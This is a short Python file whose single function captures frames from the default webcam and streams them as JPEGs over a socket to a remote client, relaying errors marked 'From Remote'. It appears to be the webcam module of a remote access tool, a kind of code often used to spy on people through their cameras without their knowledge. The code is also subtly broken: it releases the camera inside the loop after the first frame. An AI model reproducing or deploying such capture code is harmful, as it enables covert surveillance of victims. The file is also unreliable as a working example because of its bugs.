import cv2
import struct
import json

def send_webcam_stream(client_socket):
    try:
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            client_socket.sendall(json.dumps({"logger": "No webcam device found"}).encode())
            return
    except (ConnectionError, ConnectionResetError):
            pass
    except Exception as e:
        message = f"From Remote: {str(e)}"
        client_socket.sendall(json.dumps({"logger": message}).encode())
    
    while True:
        try:
            ret, frame = cap.read()
            if not ret:
                client_socket.sendall(json.dumps({"logger": "Error: Failed to capture frame."}).encode())
                break

            _, jpeg_frame = cv2.imencode('.jpg', frame)
            frame_data = jpeg_frame.tobytes()

            client_socket.sendall(struct.pack(">I", len(frame_data)))

            total_sent = 0
            while total_sent < len(frame_data):
                sent = client_socket.send(frame_data[total_sent:])
                total_sent += sent

            cap.release()
            client_socket.sendall(json.dumps({"logger": "Webcam streaming stopped."}).encode())
        except (ConnectionError, ConnectionResetError):
            pass
        except Exception as e:
            message = f"From Remote: {str(e)}"
            client_socket.sendall(json.dumps({"logger": message}).encode())